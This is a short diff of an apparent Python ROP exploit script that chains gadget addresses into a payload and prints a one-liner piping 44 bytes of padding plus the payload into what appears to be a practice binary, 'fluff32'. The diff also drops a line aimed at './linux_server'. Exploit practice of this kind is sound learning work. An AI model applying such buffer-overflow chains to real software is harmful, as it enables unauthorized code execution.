@@ -43,5 +43,5 @@ while i < len(string):
         payload += addr_conv(gadg_xor) + convertor(string[i+j]) + addr_conv(gadg_inc_c)
     i += 4
 payload += addr_conv(system_call) + addr_conv(ret_addr) + addr_conv(data)
+
 print("python -c 'print \"A\"*44+\""+payload+"\"' | ./fluff32")
-print("python -c 'print \"A\"*44+\""+payload+"\"' | ./linux_server")
